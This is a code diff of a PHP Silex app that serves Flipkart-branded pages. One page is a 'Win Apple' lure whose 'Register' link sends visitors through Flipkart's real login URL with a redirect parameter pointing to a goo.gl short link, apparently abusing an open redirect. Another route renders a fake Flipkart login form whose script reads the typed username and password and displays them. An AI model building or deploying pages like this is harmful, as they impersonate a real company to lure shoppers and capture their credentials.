@@ -10,82 +10,30 @@ $app->register(new Silex\Provider\MonologServiceProvider(), array(
   'monolog.logfile' => 'php://stderr',
 ));
 
-$header = <<<l
+$app->get('/', function() use($app) {
+
+    $short_appLink = "http://goo.gl/jpz55X";
+    $phish_link = "https://dl.flipkart.com/dl/account/login?ret=".urlencode($short_appLink);
+
+return <<<l
 <!Doctype html>
 <head>
 <title>Flipkart</title>
 </head>
 <body>
-l;
-
-$footer = <<<l
-<style>
-    body{
-        font-family:Arial;
-        background: #ccc;
-        margin:0;
-    }
-    .log{
-        font-size: 30px;
-        display: none;
-    }
-    .red{
-        background: #FFD6D6;
-        padding: 10px;
-        border: 1px solid #FF3333;
-        color: #FF3333;
-    }
-    .bg-white{background: #fff;}
-    .log,.form, .bar{ background: #fff; padding:10px;}
-    .bar{
-        font-size: 20px;
-    }
-    .form {
-        font-size: 15px;
-        margin: 10px;
-    }
-    .comp{
-        margin: 10px;
-    }
-    input[type=text],input[type=password]{
-        width:100%;
-        padding: 5px;
-    }
-    .btn{
-        width: 100%;
-        background: #f78828;
-        border: none;
-        border-radius: 3px;
-        padding: 8px;
-        color: #fff;
-    }
-</style>
-<script>
-    window.onload = function(){
-        window.test = function(){
-            var user = document.getElementById("usr").value;
-            var pwd = document.getElementById("pwd").value;
-            document.getElementById("log").style.display="block";
-            document.getElementById("logd").innerHTML = "Username = "+user+"<br>Password = "+pwd;
-        }
-    }
-</script>
-</body>
-l;
-
-$app->get('/', function() use($app) {
-
-$short_appLink = "http://goo.gl/jpz55X";
-$phish_link = "https://dl.flipkart.com/dl/account/login?ret=".urlencode($short_appLink);
-
-return <<<l
-    $header
-    <h2>Win something</h2>
+    <h2>Win Apple</h2>
     <hr>
     <h3>1. Visit this page on your phone</h3>
     <h3>2. Visit below link</h3>
     <a href="$phish_link">Register</a>
-    $footer
+    <style>
+        body{
+            font-family:Arial;
+            background: #ccc;
+            margin:0;
+        }
+    </style>
+</body>
 l;
 
 });
@@ -95,7 +43,11 @@ l;
 $app->get('/recheckLogin', function() use($app) {
 
 return <<<l
-    $header
+<!Doctype html>
+<head>
+<title>Flipkart</title>
+</head>
+<body>
     <div class="login">
         <div class="bar">Login</div>
         <div class="form">
@@ -122,9 +74,59 @@ return <<<l
             </div>
         </div>
     </div>
-    $footer
+    <style>
+        body{
+            font-family:Arial;
+            background: #ccc;
+            margin:0;
+        }
+        .log{
+            font-size: 30px;
+            display: none;
+        }
+        .red{
+            background: #FFD6D6;
+            padding: 10px;
+            border: 1px solid #FF3333;
+            color: #FF3333;
+        }
+        .bg-white{background: #fff;}
+        .log,.form, .bar{ background: #fff; padding:10px;}
+        .bar{
+            font-size: 20px;
+        }
+        .form {
+            font-size: 15px;
+            margin: 10px;
+        }
+        .comp{
+            margin: 10px;
+        }
+        input[type=text],input[type=password]{
+            width:100%;
+            padding: 5px;
+        }
+        .btn{
+            width: 100%;
+            background: #f78828;
+            border: none;
+            border-radius: 3px;
+            padding: 8px;
+            color: #fff;
+        }
+    </style>
+    <script>
+        window.onload = function(){
+            window.test = function(){
+                var user = document.getElementById("usr").value;
+                var pwd = document.getElementById("pwd").value;
+                document.getElementById("log").style.display="block";
+                document.getElementById("logd").innerHTML = "Username = "+user+"<br>Password = "+pwd;
+            }
+        }
+    </script>
+    </body>
 l;
-
 });
 
 $app->run();
